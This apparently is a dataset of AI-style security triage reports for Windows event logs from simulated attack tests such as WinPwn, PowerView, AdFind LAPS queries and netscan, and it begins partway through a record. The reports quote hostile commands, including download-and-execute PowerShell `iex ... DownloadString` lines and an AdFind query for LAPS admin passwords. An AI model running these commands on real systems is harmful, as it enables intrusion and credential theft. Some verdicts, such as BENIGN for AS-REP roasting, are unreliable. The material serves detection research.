**Guidance on How to Proceed:**
1. Investigate the context and necessity of the PowerShell script execution. Determine the legitimate requirement, if any, or proceed to isolate and analyze the script.
2. Review any misconfiguration that may prompt unnecessary credential validation attempts toward the Microsoft account and ensure these are legitimate.
3. Correlate the usage of `taskhostw.exe` with allowable administrative activities, ensuring no unauthorized commands were executed.

**Resolution: SUSPICIOUS**

Based on the presence of potentially unauthorized script execution and dubious failed login attempts, the activities are deemed suspicious. Further investigation is warranted to clarify the intent and legitimacy of these actions."
WinPwn - winPEAS,"### Detailed Analysis of Windows Event Logs

Upon analyzing the provided Windows event logs, there are several observations and evaluations about the activities recorded:

#### Windows PowerShell Log
1. **Indicator of Suspicious Activity**: The PowerShell logs indicate the execution of a script using `powershell.exe` with the command:
   ```plaintext
   iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/script/script/121dcee26a7aca368821563cbe92b2b5638c5773/script.ps1')
   ```
   - **Implication**: This is a classic ""DownloadString"" method that attackers use to download and execute scripts from the internet.
   - **Concern**: The script is being fetched from a public repository, which is suspicious unless explicitly verified and known to be trusted, particularly when actions such as privilege escalation or enumeration (e.g., via winPEAS) are being carried out.

#### Sysmon Log
1. **Processes of Interest**: The logs show the Windows PowerShell process starting with the suspicious command referenced in the PowerShell logs. Here are notable points:
   - **Execution of `powershell.exe`**: This lines up with the command found in the PowerShell log, indicating unauthorized script execution.
   - **User Context**: The actions are performed under the credentials `SERVER002\admin_test`, which can imply the script execution may have higher privileges than normal.
   - **Process Ancestry**: Several `conhost.exe` processes, which can be related to console windows opened, are associated with the main PowerShell process, likely for the display of script output.

2. **Network Connections and Data Transfer**:
   - No explicit entries are detailing network connections or extensive data exfiltration, but the PowerShell download poses a severe security threat.

#### System and Security Logs
1. **Time Changes**: There are multiple instances of security-auditing logs where time changes are involved, recorded by `svchost.exe`.
   - **Assessment**: While time changes can be benign, frequently manipulated time logs without clear administrative context can suggest attempts at tampering to obscure log timings.

#### Application Log
1. **Windows Defender Status**: The logs confirm Windows Defender is running (SECURITY_PRODUCT_STATE_ON).
2. **Edge Update**: Multiple entries indicate the update processes of Microsoft Edge, consistent with normal behavior unless malicious Edge modifications are detected which, in this log series, were not indicated.

### Assessment and Resolution

- **Indicators of Malicious Activity (IoCs)**: The specific usage of PowerShell to download and execute an external script, notably containing functionality often used in privilege escalation and environment enumeration (suggested by `winPEAS`), is a strong indicator of potentially malicious behavior.
- **Threat and Risk Evaluation**: The risks involve unauthorized elevation of privileges, potential data breach through the execution of external scripts, and environment reconnaissance, preparing the ground for further exploitation.
- **Proceeding Guidance**: Immediate containment measures should be prioritized to stop potential exploitation. Verify the identities and activities of accounts involved (`admin_test`); additionally, perform a comprehensive review of network logs and endpoints that might have communicated with external domains.

### Conclusion
- **Final Resolution**: **MALICIOUS** - The log data includes definitive activities that are considered malicious due to unauthorized script execution and potential privilege escalation attempts. Immediate investigation and mitigation actions are critical to protect the integrity and security of the host environment."
System Service Discovery - net.exe,"### Analysis of the Windows Event Logs:

#### Security Log:

1. **Event ID 4634 (Logoff):**
   - User `admin_test` logged off. This is generally a routine event unless combined with suspicious activity.

2. **Event ID 4672 (Special Logon):**
   - `admin_test` logged in with high privileges, accessing various special privileges like `SeDebugPrivilege`, `SeBackupPrivilege`, `SeRestorePrivilege`, etc. Such privileges are commonly used by administrators but can be concerning if unexpected, especially on service accounts or infrequently used accounts.

3. **Event ID 4624 (Logon):**
   - The logon by `admin_test` using NTLM from the workstation `DESKTOP-3HL5B2P`. Repeated logins using NTLM might suggest lateral movement attempts if unexpected, as Kerberos is normally preferred in modern Windows environments.

4. **Event ID 5379 (Credential Manager):**
   - Several failed credential read attempts by the `SERVER002$` account indicate possible unsuccessful attempts to access credential information, possibly related to service accounts or system processes attempting to retrieve credentials improperly or without permission. The `ReturnCode` suggests failure due to permission issues.

#### Sysmon Log:

1. **Event ID 1 (Process Creation) and Event ID 5 (Process Termination):**
   - Repeated use of administrative utilities and Windows Command Line tools (`wevtutil.exe`, `conhost.exe`, `net.exe`, `whoami.exe`, `cmd.exe`) with `admin_test`. Commands like `hostname`, `whoami`, and `net` are not unusual but can be red flags if used excessively or unexpectedly, as they are often used in recon activities.
   - The logs highlight `net.exe start` capture of service states, typically associated with discovering running services and might imply recon for persistence.

2. **Edge Update and Malware Protection Updates:**
   - Processes like `MicrosoftEdgeUpdate.exe` and `MpSigStub.exe` are seen executing, related to legitimate software updates for Microsoft Edge and Windows Defender. This sounds like standard behavior during regular updates.

3. **Taskhost and System Processes:**
   - Processes such as `taskhostw.exe` and `wuauclt.exe` run normally under `NT AUTHORITY\SYSTEM` for legitimate system updates.

4. **System Updates:**
   - There are references to Windows Defender Antivirus updates (Security Intelligence updates), suggesting regular, automated maintenance activity.

### Assessment:

**Suspicious Activity:**
- The repeated high-privilege logons and subsequent use of administrative utilities and command-line tools are potential indicators of malicious recon activity or lateral movement attempts.
- Unsuccessful credential manager access attempts may indicate attempts to misuse or extract sensitive credentials.

**Benign Activity:**
- The presence of software updates for Microsoft Edge and Windows Defender seems routine and does not indicate malicious activity.
- System processes for task hosting and update management are standard operations.

### Conclusion:

**Resolution: SUSPICIOUS**

The logs indicate potential suspicious behavior due to the high-privilege account usage and admin tool execution patterns, warranting further investigation. However, there is no definitive evidence of compromise solely based on the provided logs. It's recommended to:
1. Investigate the legitimacy of the `admin_test` account actions.
2. Review account statistics—frequency, source, and context of admin logins.
3. Monitor for any further unusual or elevated access attempts.
4. Consult organizational records or the involved user for context around the actions observed.

These steps should confirm whether the events are authorized actions or signs of unauthorized activity."
Get-ADUser Enumeration using UserAccountControl flags (AS-REP Roasting),"### Analysis:

After analyzing the provided logs, the following observations can be made to determine the security posture:

1. **Security Logs:**
   - Multiple successful logon events (EventID 4624) with LogonType 5, which indicates a service start. These are expected on a server as services frequently log on at startup or on a scheduled basis.
   - Privileged service accounts (SYSTEM) with a variety of privileges (EventID 4672) are performing operations, which is typical for a server environment.
   - There are repeated occurrences of EventID 5379, which are credential validation attempts with a ReturnCode of `3221226021`. This code translates to ""STATUS_LOGON_FAILURE,"" suggesting failed attempts to validate a MicrosoftAccount.Token, which could potentially be normal operations of cached credentials being invalid or service probes.

2. **Sysmon Logs:**
   - A series of process creations involving `powershell.exe` by user `admin_test` found in Event ID 1. The command executed is retrieving information about AD users with a specific flag using PowerShell. Although the PowerShell activity is worth noting, the command appears to be an informational query and was executed by an administrative account (`admin_test`), which in itself does not constitute evidence of malicious intent.
   - Presence of `wevtutil.exe` and `conhost.exe` processes. The `wevtutil.exe` could be used for legitimate tasks, such as exporting and managing event logs, but if unexpected, can signal log tampering.
  
3. **Application Logs:**
   - Logs related to Edge updates (`edgeupdate`) are found, which correspond to normal operations related to software updates.

4. **PowerShell Logs:**
   - PowerShell engine starts and runs with no high-integrity tasks reported. It shows that PowerShell was used to query specific user account control properties, typical for administrative functions.

### Conclusion:

The events observed, such as system services logging in or software updates, are consistent with routine operations on a Windows server. The repetitive credential validation failure does not show associated lateral movement or privilege escalation patterns typical of a compromise attempt.

- **Resolution: BENIGN** - The logs primarily indicate routine server operations and updates. The activities observed do not currently demonstrate any clear signs of maliciousness but should be kept on watch for unusual patterns in the future, specifically the failed credential checks and any unauthorized administrative commands. Monitoring and a security baseline should be maintained to alert on deviations."
Device Driver Discovery,"Upon reviewing the provided logs, several observations and findings can be made. Below is a detailed analysis of key elements identified in the logs:

### Analysis

1. **Use of `wevtutil.exe` and `conhost.exe`**:
   - The logs reveal multiple executions of `C:\Windows\System32\wevtutil.exe` and `C:\Windows\System32\conhost.exe` by the user `SERVER002\admin_test`. Both `wevtutil` and `conhost` are legitimate Windows utilities; `wevtutil` is used to manage Windows event logs, while `conhost` is related to console windows.
   - While the execution of these processes may be legitimate, the frequency and pattern of their execution could indicate their misuse for malicious purposes, such as event log clearing or masquerade attempts.

2. **Execution of Administrative Commands**:
   - Commands like `whoami.exe`, `hostname.exe`, and `driverquery.exe` are executed, which are usually used to gather system information. This could be indicative of common reconnaissance activities where an attacker tries to understand the environment.
   - `driverquery /v /fo list` and `driverquery /si /fo list` were run through PowerShell, possibly to fetch detailed driver information including hardware IDs, which may not be a typical user action.

3. **High Integrity Level PowerShell Execution**:
   - There are instances of high integrity PowerShell execution with the command `driverquery` showing in both PowerShell and Sysmon logs. It signifies that the user had high privileged access during these commands, raising suspicion of potential privilege escalation.
   - The context and commands do not have inherently malicious characteristics but should be verified against typical usage.

4. **Adjustments to System Time**:
   - There are events (ID 4616 in the Security log and corresponding Kernel-General log entries) where the system time was adjusted. While this in itself is not malicious, it may be related to attempts to modify timestamps for activities or avoid detection.

5. **Microsoft Edge Update Processes**:
   - Multiple entries suggest the updating processes of Microsoft Edge, consistent with scheduled or manual updates. The processes are running with `NT AUTHORITY\SYSTEM`, indicating legitimate high privilege updates.
  
6. **Security Log Events**:
   - Privileged user (`admin_test`) logs include SeDebugPrivilege, SeTakeOwnershipPrivilege, and SeBackupPrivilege, which are significant privileges. The events reflect a privileged user but need correlation with other activities to confirm malicious intent.

7. **Logon Sessions**:
   - There are NTLM logons (both IPv4 and IPv6 addresses noted) which do not immediately raise alarms but should be evaluated with corresponding network logs for anomalies in expected login patterns.

### Assessment and Recommendations

Based on the observations:

- **Resolution**: **SUSPICIOUS**
  - The logs present patterns such as frequent high-privilege commands, and system information gathering that are commonly associated with reconnaissance activities in the pre-attack stage. However, no clear evidence of unmistakable malicious execution is present.
  
- **Recommendations**:
  - **Investigate User Activity**: Audit user activity (especially `admin_test`) to confirm whether the observed actions align with normal administrative and operational activities.
  - **Credential Safeguards**: Ensure that credentials with high privileges are secure, and monitor for anomalous use.
  - **Monitor Time Change Activities**: Time alterations can be an indicator of tampering. Monitor for any unauthorized time change events.
  - **Verify Update Processes**: Although Edge update processes are legitimate, check for any deviations from normal patterns in update-related activities.
  - **Network Correlation**: Cross-reference the logon events and associated IP addresses with network activity for any anomalies.
  - If any policy or protocol violations appear, or if these patterns persist without justification, escalate response to a potential compromise.

Continuing with diligence in monitoring and applying these recommendations will help maintain the security posture as well as potentially uncover further indicators that clarify the intent of the actions."
WinPwn - MS17-10,"In the provided logs for the Windows machine ""Server002,"" the following observations can be made:

**System Log:**
- The events in the System log show normal time change adjustments and service operations typical in a Windows environment. There isn't any indication of malicious activity such as unauthorized privilege escalation or the execution of unknown processes.

**Windows PowerShell Log:**
- The PowerShell log contains a particularly suspicious entry. It shows the execution of a PowerShell script that downloads and executes content from `https://raw.githubusercontent.com/script/script/121dcee26a7aca368821563cbe92b2b5638c5773/script.ps1`. This sort of behavior, especially without any form of authentication or verification, is a common tactic for delivering malware or executing unauthorized scripts. The script also references ""MS17-10"", which is associated with the EternalBlue vulnerability.

**Security Log:**
- The security logs record privilege assignments and logon events. Notably, there is a logon event using NTLM authentication, which is fairly common practice in certain environments. The user ""admin_test"" seems to be logging on over the network, which is another vector commonly used in lateral movement attacks.

**Application Log:**
- The application log shows Windows Defender being active, which suggests security measures are in place. However, there is no indication in this log of any block or quarantine actions that might align with the suspicious PowerShell activity.

**Sysmon Log:**
- The Sysmon log records indicate several command-line executions that are benign by themselves, such as usage of common Windows administrative tools. However, there is a consistent execution of processes with high integrity levels, specifically ""Windows PowerShell"" that runs with a ""High"" integrity level. This, linked with the PowerShell script execution from an external source, contributes to the suspicion of potential compromise.
- The ""whoami.exe"" and ""hostname.exe"" might be legitimate administrator actions; however, given the context of the unsolicited PowerShell script execution, they might be utilized to perform reconnaissance.

**Assessment:**
Several entries in the logs indicate potential unauthorized or malicious actions, particularly the PowerShell execution directly downloading from an untrusted source over the internet without additional security controls. This behavior matches patterns used in initial stages of attacks or unauthorized script execution. Given this significant finding and the context surrounding it, the entries align with a probable security threat. 

**Resolution: MALICIOUS**

**Guidance:**
1. Immediately investigate the system for any unauthorized access or changes around the time of these logs.
2. Isolate the affected system from the network if possible to prevent any potential further compromise or data exfiltration.
3. Conduct a full malware scan and forensic analysis on this machine to identify any payloads or additional IOCs (Indicators of Compromise).
4. Review logs from any firewalls or endpoint detection systems to understand the ingress/egress points associated with the IP address related to the suspicious script.
5. Implement or verify strict controls on the execution of PowerShell scripts, including restricted policies or authorized script lists.
6. Consider resetting credentials and reviewing account privileges, especially for the ""admin_test"" account noted in the logs.
7. Report and escalate the incident according to your organization’s security incident response protocols."
Port Scan NMap for Windows,"### Detailed Analysis

The logs provided contain several entries related to system, security, PowerShell, Sysmon, and application activity on the Windows host ""Server002"". Here is a breakdown of events that might be considered suspicious or indicative of potential malicious activity:

1. **PowerShell Activity:**
   - Multiple PowerShell events showing the execution of the command `nmap 127.0.0.1`. This itself might not be malicious, but the use of network scanning tools (like nmap) without authorization should raise a red flag. It suggests potential network reconnaissance or an attempt to map internal network structures.
   
2. **Sysmon Logs with Process Creation:**
   - The Sysmon logs show process creation for `cmd.exe` running with `nmap`. This corresponds with the PowerShell command mentioned earlier, indicating execution of a network scanning tool.
   - The presence of `np_map-7.80-setup.exe`, installations of `npcap`, and several instances of `vcredist_x86.exe` in temporary directories can suggest software installation activity. These activities could indicate either legitimate software installation or preparation for executing network-related tasks.

3. **Unusual Installation and Tools Utilization:**
   - Events showing the installation of `Npcap` drivers and various Microsoft Visual C++ redistributables via temporary directories. While these packages are legitimate, their installation could indicate preparation for running network tools or malware packing additional tools that rely on these components.
   - The use of `certutil.exe` to add certificates to the store, specifically with file paths in temporary directories, suggests potential nefarious use. `certutil` is a common tool used by attackers for certificate management as part of malware execution strategies.

4. **Security Log Activity:**
   - Multiple logon events (`4624`) and privilege elevation (`4672`) using SYSTEM, which are typical during various operations but could be suspicious if these were unexpected.
   - Note, however, the absence of IP addresses in these logons, suggesting local or network service activities as opposed to remote desktop or session-based access, making it less suspicious.

5. **Application Activities:**
   - The logs related to `MsiInstaller` events generally indicate installation activity, consistent with observed Sysmon logs of software installations.

### Assessment

The collective analysis of the logs suggests that the activity is **SUSPICIOUS**. The deployment and use of network analysis tools such as `nmap` combined with PowerShell scripting, the usage of `certutil.exe` with local certificate stores, and software installation from temporary directories need further investigation to rule out malicious intent.

### Guidance

1. **Immediate Actions:**
   - Verify the purpose of installed software, especially tools like `nmap` and `Npcap`, with the IT department or relevant personnel.
   - Review the legitimacy of certificates added using `certutil.exe`.
   - Examine user `admin_test` and its activities, given its consistent involvement in process execution as noted in the logs.
   - Ensure security tooling and controls are monitoring for anomalous PowerShell or command-line activity and restricting unauthorized execution.

2. **Further Investigation:**
   - Determine the justification for the installation and use of network scanning utilities.
   - Conduct a network traffic analysis to ensure no unauthorized scanning or data exfiltration attempts are occurring.
   - Verify system patch levels and review endpoint protection logs for additional indications of compromise.

Resolution: **SUSPICIOUS** - The logs exhibit behavior requiring further verification to ascertain the intent and legitimacy of the actions observed."
Get-DomainGPO to display group policy information via PowerView,"**Analysis Summary:**

Upon reviewing the provided event logs, it is clear that there are multiple indications of potentially malicious activity involving the execution of PowerShell scripts in an unconventional manner, suggesting a compromise:

1. **PowerShell Logs:**
    - The logs contain multiple entries where PowerShell is being executed with the `-nop -exec bypass` flags. These flags are often used to circumvent execution policy restrictions in PowerShell, making it easier to run potentially malicious scripts.
    - The presence of the `IEX (New-Object Net.WebClient).DownloadString(...)` pattern indicates the use of inline execution of a remote PowerShell script. This technique is commonly seen in attacks where adversaries download and execute a script directly from the internet without saving it to disk, making detection harder.
    - Calls to an external GitHub URL raise concerns, especially if the scripts being executed are not verified or are not part of normal operations.

2. **Sysmon Logs:**
    - There are several Sysmon events detailing the execution of processes such as `powershell.exe`, `whoami.exe`, `hostname.exe`, which could be legitimate on their own, but given the context of execution and accompanying behavioral indicators, these are suspicious.
    - The hashes and execution details link back to potentially unwanted child processes launched from PowerShell indicating a suspicious activity chain.

3. **Application Logs and Other Logs:**
    - Regular system and application events such as Edge updates and time synchronization events appear routine and do not indicate any immediate concern on their own.

Given the combination of the suspicious PowerShell operations and the use of execution policies that are typically aligned with malicious behavior:

**Threat & Risk Assessment:**
- There is a high risk that the system `Server002` has been compromised. The behavior fits patterns often associated with the deployment or execution of malware, particularly indicative of attempts to gain domain or environmental awareness through `Get-DomainGPO`.

**Guidance on How to Proceed:**
- Immediate steps should be taken to isolate the involved system (Server002) from the network to prevent further spread or data exfiltration.
- Conduct a thorough forensic analysis on the machine to determine the full scope and impact of the compromise.
- Check for unauthorized changes in Group Policy Objects and other domain-related configurations.
- Identify and validate any scripts downloaded from the external URL to understand their purpose and potential payloads.
- Implement monitoring and alerting for similar PowerShell execution patterns across the network.

**Resolution:**
- **MALICIOUS** - The logs contain activity that is consistent with known malicious tactics and should be treated as a compromise."
Detect Virtualization Environment via WMI Manufacturer-Model Listing (Windows),"### Detailed Analysis of the Provided Logs:

#### Security Logs:
1. **Event ID 4616** - These events show the changing of system time by `svchost.exe`. It is executed under the `LOCAL SERVICE` account with the SID `S-1-5-19`. Changing system time is not inherently malicious but can be used by adversaries to evade detection. 
2. The time changes are minor increments and relatively close in time, which generally coincide with the regular synchronization activities.

#### Windows PowerShell Logs:
1. **PowerShell Execution** - The script checks for the virtualization environment by querying system details like the manufacturer and model of the computer. It ends with a message about virtualization detection.
2. This behavior indicates a reconnaissance attempt to understand the environment it is operating in, typically seen in penetration testing or scripting activities. 

#### Application Logs:
1. **Event ID 16384** - This shows an operation from the Software Protection Platform service, which appears normal.
2. **Edge Update** - Stopping the service seems standard for an update process.

#### System Logs:
1. **Event ID 1 & 24** in these logs appear to show normal system activities related to time changes or kernel general operations.

#### Sysmon Logs:
1. **Process Executions** - There are numerous executions of legitimate Windows processes (`wevtutil.exe`, `conhost.exe`, `whoami.exe`, `powershell.exe`) under the `admin_test` account.
2. **Reconnaissance via `whoami.exe`** - This confirms a user querying for current session details.
3. **PowerShell Execution** - Again confirms the execution checking for virtualization, aligning with the prior PowerShell logs.
4. **Edge Update** - Multiple executions related to Microsoft Edge update processes are evident and appear normal for an update operation.

### Assessment:
- **Reconnaissance Suspicions**: The PowerShell scripts attempting to detect virtualization could be suspicious as they indicate an effort to understand the environment better, often seen in both benign scripting activities and malicious reconnaissance.
- **Wevtutil Executions**: These can be used for log manipulation but also for legitimate purposes like querying events. No explicit misuse or malicious command-line arguments are evident from this log alone.

### Conclusion:
The activities present are consistent with scripted reconnaissance, likely by an administrator or software looking to determine the environment (e.g., virtual vs. physical). There is a notable absence of any direct indicator of malicious activity such as privilege escalations, unauthorised access attempts, or persistence mechanisms.

**Resolution: SUSPICIOUS** - While the detected activities (e.g. PowerShell script checking for virtualization) could be part of legitimate administrative actions, they warrant further investigation to confirm there is no unauthorized scripting or reconnaissance involved. A deeper dive into the origin and purpose of the scripts and context around user activities on the server is recommended."
Suspicious LAPS Attributes Query with adfind ms-Mcs-AdmPwd,"Based on the analysis of the Windows event logs provided, the following observations have been made:

### Suspicious Activities Detected:

1. **PowerShell Execution with Suspicious Command Line**:
   - The PowerShell logs indicate execution of a PowerShell command using `AdFind.exe` located in an unusual directory: `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\`.
   - The command in question is querying for `ms-Mcs-AdmPwd` and `ms-Mcs-AdmPwdExpirationTime` attributes of objects with `objectclass=computer` in the domain. This activity can suggest an attempt to gather sensitive password-related information from Active Directory, possibly linked to exploitation attempts like Privilege Escalation or Lateral Movement.

2. **Time Change Events**:
    - The Security log shows events (Event ID 4616) indicating changes to system time. Changing the system time can be leveraged by attackers to evade detection or to sync malicious activities with certain timestamps.

3. **Use of AdFind.exe**:
   - `AdFind.exe` is a known tool often used by attackers to query Active Directory information. Its presence, particularly in a temporary location rather than a standard directory, and the specific query made, indicates potential malicious reconnaissance.

4. **High Integrity Level Processes**:
   - Several processes are running with high integrity levels, including PowerShell, whoami, and others, which might not be suspicious in isolation but, when combined with the PowerShell activity, could indicate misuse of elevated privileges.

### Assessment:

Given the context of the logs, the PowerShell execution containing `AdFind.exe` usage, and the queries being performed, the activities logged appear potentially malicious. The querying of Active Directory for sensitive password-related attributes using `AdFind.exe` points towards a potential reconnaissance phase of a cyberattack.

### Resolution:

**Resolution: MALICIOUS**

The indicators, such as the use of `AdFind.exe` for querying sensitive attributes and the suspicious PowerShell commands, are definitive signs of malicious behavior. Immediate action is recommended to investigate the affected host, check for any further malicious activity, and mitigate potential compromise by isolating the system, conducting a forensic investigation, and reviewing AD for unauthorized access to sensitive credentials.

### Recommended Actions:

1. **Isolate the Affected System**: To prevent further potential lateral movement or data exfiltration.
2. **Forensic Investigation**: Perform a detailed forensic analysis on the affected host to extract any further indicators of compromise.
3. **Review Active Directory**: Inspect AD security logs for suspicious authentications and changes, especially around the time of the event logs.
4. **Change Credentials**: For any sensitive accounts that may have been exposed due to this activity.
5. **Patch and Update**: Ensure all systems are up-to-date with the latest security patches.
6. **Increase Monitoring**: Enhance monitoring on all systems for anomalous activity, focusing on PowerShell executions and Active Directory queries."
View available share drives,"### Detailed Analysis:

#### Security Log:
1. **EventID 4616**: This event logs the changing of the system time. The events display normal behavior as they indicate the time being updated by the LOCAL SERVICE account using the svchost.exe process, which is typical of Windows Time Service operations. No abnormal behavior is indicated here, as system time changes can occur routinely due to time synchronization services.

#### System Log:
- **EventIDs related to Windows Update**:
    - **EventID 19**: Reflects a Windows Defender Antivirus update, which is a routine system process to ensure antivirus definitions are current. 
    - **EventID 24** and **1**: Relate to time changes, which aligns with the security logs. This is typical behavior of the Windows Time Service adjusting time through known NTP servers. 
    - Combined, these events are standard and benign, indicating no malicious behavior.

#### Application Log:
- **Windows Defender**: Confirmed to be active and running, as indicated by the ""SECURITY_PRODUCT_STATE_ON"" state, marking a healthy and operational security status.
- **Edge Update Events**: These events showing the stopping of the EdgeUpdate service are common, especially after completing an update process. They do not indicate suspicious behavior on their own.

#### Sysmon Log:
- Frequent use of `wevtutil.exe` and `conhost.exe` by a user 'admin_test' is noted:
  - `wevtutil.exe` is used to manage Windows event logs, which could be legitimate given the user context but might warrant further review if the user's activities are not aligned with their role.
- **Process Execution**: 
  - **cmd.exe with /c net share**: Indicates the checking or setting of network shares. This activity, especially executed rapidly in sequence, could be suspicious if the context is not aligned with administrative tasks or without user awareness. It can indicate lateral movement attempts in some attack vectors.
  - **whoami.exe, hostname.exe**: These tools are often used to gather information about the system environment, commonly seen in both administrative tasks and during unauthorized reconnaissance activity.
- **Edge Update**: A series of edge-related updates indicating normal system maintenance tasks. The use of `MicrosoftEdgeUpdate.exe` and similar update-related processes seems routine.

### Assessment and Conclusion:

1. **Network Commands**: The repeat execution of network-related commands (`net share`) without more context (administrative work, user intent) can be interpreted as suspicious, particularly if the user `admin_test` does not typically engage in such network tasks.
   
2. **High Integrity Levels**: Processes running with high integrity level, combined with the use of diagnostic tools, can indicate a possible exploration or misconfiguration if not strictly following normal administrative boundaries.

3. **System Time Updates**: The time changes appear benign and consistent with synchronized time service.

4. **EdgeUpdate and Defender Updates**: These appear legitimate and part of regular system update processes.

### Resolution:

- **SUSPICIOUS**: The activity should be further investigated to determine whether the use of network commands and information-gathering tools by `admin_test` aligns with their assigned roles, and to verify the legitimacy of these actions. Following this, further internal logs review and verifying user intent with the administrative team will clarify the situation."
Enumerate Remote Hosts with Netscan,"Upon analyzing the provided Windows log entries, several observations can be made regarding potential suspicious activities:

### Analysis Summary:

1. **Security Logs (Event IDs 5379, 4624, 4672):**
   - The security log primarily captures event ID 5379, which is related to unsuccessful credential delegation/logins. The repeated failure attempts with a return code of `3221226021` (STATUS_LOGON_FAILURE) could indicate an attempted unauthorized access or misconfiguration. These accesses pertain to ""MicrosoftAccount:user=02txoixylodcstop"" and WindowsLive tokens.
   - The log entries for event ID 4624 and 4672 show a successful logon of the SYSTEM account with high privileges. The presence of many debugging and system-level privileges (`SeDebugPrivilege`, among others) being consistently granted can be a normal system operation, but it should be monitored for potential misuse.

2. **Sysmon Logs:**
   - These logs capture processes such as `powershell.exe`, `wevtutil.exe`, `conhost.exe`, initiated by the user `SERVER002\admin_test`.
   - The usage of PowerShell to execute a network scanning tool ""netscan"" in a temporary directory is particularly suspicious. The command includes hidden execution and writes results to a file, suggesting activity that could be part of a lateral movement or reconnaissance efforts:
     ```
     CommandLine: ""powershell.exe"" & {cmd /c 'C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\netscan\64-bit\netscan.exe' /hide /auto:""$env:temp\dataNetscanOutput.txt"" /range:'127.0.0.1-127.0.0.1'}
     ```
   - The installation of Microsoft Edge updates is seen, which appears legitimate but could obscure other activities if not properly verified.

3. **Windows PowerShell Logs:**
   - Activities log the execution of scripting with PowerShell confirming the runtime command indicative of scanning activities. It appears consistent with what is observed in the Sysmon logs.

4. **System Logs:**
   - Typical system logs displaying Windows Update activities, installing security updates. These align with standard maintenance tasks and do not appear immediately concerning without additional context.

5. **Application Logs:**
   - Windows Defender is reported as being active.

### Conclusion and Recommendations:

Based on the collected logs, there is clear evidence of potentially suspicious activities, particularly relating to the execution of a network scanning utility using PowerShell. The behavior aligns with actions often associated with reconnaissance movements conducted by someone with insider access.

### Resolution:
- **SUSPICIOUS**: The activity around the network scanning and use of PowerShell warrants a deeper investigation. Although there is no definitive indication of compromise, the behavior is anomalous and could potentially indicate attempts at unauthorized access or data gathering within the network.

### Next Steps:

1. **Investigate the 'admin_test' User:** Examine the legitimacy of the `admin_test` account activities and review recent account history and login patterns.
   
2. **Validate Scanning Activities:** Determine whether the execution of the network scan (netscan.exe) was authorized or part of an automated script used legitimately.

3. **Monitor Privileged Accounts:** Keep track of ongoing activities by accounts with elevated privileges, particularly around the time frames observed in the logs.

4. **Enhance Monitoring:** Implement additional security monitoring and alerting for high-integrity PowerShell executions and unexpected network discoveries.

5. **Check for Misconfigurations:** Review security configurations around Microsoft Accounts and ensure that credential delegations are appropriately set.

Engage with the IT and cybersecurity team to follow up on these findings, and consider restricting and auditing PowerShell activities more closely."
Peripheral Device Discovery via fsutil,"After analyzing the provided Windows event logs, here is a detailed assessment:

### Application Log
The application log records primarily show the stopping of the ""edgeupdate"" service and an entry for the Software Protection Platform Service. Stopping services without a valid reason, particularly during work hours, could be considered unusual. However, based on the available data alone, there's no direct indication of this being malicious as applications like Edge may stop their update services when updates are complete or in response to system usage.

### System Log 
The system log entries mostly consist of kernel and time synchronization events, which are normal behavior for a Windows machine and do not indicate any compromise.

### Security Log
The security log records show a time change event executed by the `svchost.exe` process running under the `LOCAL SERVICE` account. Changing system time could be suspicious if it aligns with an attacker's goal of evading time-based security measures or logs, but a single occurrence is not inherently malicious, especially if typical in the environment or expected due to legitimate administrative tasks or updates.

### Sysmon Log
The Sysmon logs reveal numerous executions of Microsoft Edge and related processes. Most of the processes executed are related to Edge updating (`MicrosoftEdgeUpdate.exe` and associated executables). The processes run under `NT AUTHORITY\SYSTEM` with a high level of integrity, indicating they possess system-level permissions, which is not uncommon for update operations by trusted system services.

**Key Suspicious Entries**:
1. **Command Line Usage**: The Sysmon logs include the use of tools like `whoami.exe` and `cmd.exe` with seemingly innocuous commands such as `fsutil fsinfo drives`. While these executions can be part of normal activity to check system configurations, repeated and automated usage might indicate reconnaissance typically associated with pre-attack phases or internal exploration post-compromise.

2. **Edge Update Behavior**: There's an unusual frequency in activity of Edge Update processes. While the updates themselves aren't inherently suspicious, the execution of the same batch of processes in separate cmds does require context as rapid consecutive updates aren't typical. If such frequent updates are out of the ordinary for the environment, further investigation may be needed to determine if there is unauthorized manipulation.

**Assessment and Resolution**:
- The logs contain a mix of expected system and application activities with some entries needing context for a complete investigation.
- The entries related to system and application updates, particularly those of Edge, suggest system maintenance activities which could explain some process executions.

### Conclusion
**Resolution**: **SUSPICIOUS**

The analysis identifies potentially suspicious activity—such as unusual command line usage and numerous service interactions—warranting further investigation. It's advisable to further investigate recent patch schedules, scrutinize command histories, and track user roles for actions tied to this machine. Additionally, confirming any changes or anomalies with responsible IT staff or logs that give context to the Edge update process can clarify normal versus abnormal operations."
Enumerate all accounts via PowerShell (Domain),"Upon analyzing the provided Windows event logs, several points of interest are observed:

1. **Frequent Execution of `wevtutil.exe` and `conhost.exe`:** 
   - The logs show a series of executions involving `wevtutil.exe` and `conhost.exe` by the user `admin_test`. While `wevtutil.exe` is a legitimate Windows tool for managing Windows Event Log resources, its frequent execution alongside `conhost.exe` in a short timeframe could suggest log manipulation or examination activities. This could be benign if part of regular administrative tasks but may raise concerns if unexplained.

2. **Commands Executed via PowerShell:**
   - There is a command execution using PowerShell with the following command line: `""powershell.exe"" & {net user /domain, get-localgroupmember -group Users, get-aduser -filter *}`. This command indicates attempts to enumerate user accounts and group memberships both locally and on the domain. These actions can be part of legitimate administrative processes but can also be used for reconnaissance by an attacker.

3. **PowerShell Activity:**
   - The provided PowerShell logs reflect usage consistent with the actions described in the Sysmon logs, specifically using commands to gather user and group information. This could be a normal administrative task if explained by business needs or could be suspicious if not.

4. **Security Log – Group Membership Enumeration:**
   - Event IDs `4799` in the security logs correlate with the PowerShell commands for enumerating the Builtin ""Users"" group. This reinforces the possibility that the actions were indeed executed by the PowerShell script mentioned above.

5. **High Integrity Level Executions:**
   - The incidents involving `powershell.exe`, `conhost.exe`, `whoami.exe`, and others show high integrity levels, suggesting that these processes were running with elevated privileges, which aligns with activities of a user with administrative rights.

### Assessment and Conclusion:
- **Suspicious Behavior:** The repeated use of `wevtutil.exe` in conjunction with `conhost.exe`, combined with direct reconnaissance commands executed through PowerShell, suggests possible suspicious activity. While these actions might be part of a legitimate administrative routine, the lack of specific context or confirmation necessitates further investigation.
- **Potential Threats and Risks:** These activities could indicate attempts at reconnaissance and possibly manipulation of event logs, both of which could be preparatory steps for further malicious activities.
- **Recommendations:** 
  - Verify the legitimacy of the account `admin_test` and cross-check if these actions were performed by an authorized administrator performing scheduled tasks.
  - Review additional logs or alerts around the same timeframe to identify any more indicative patterns of compromise.
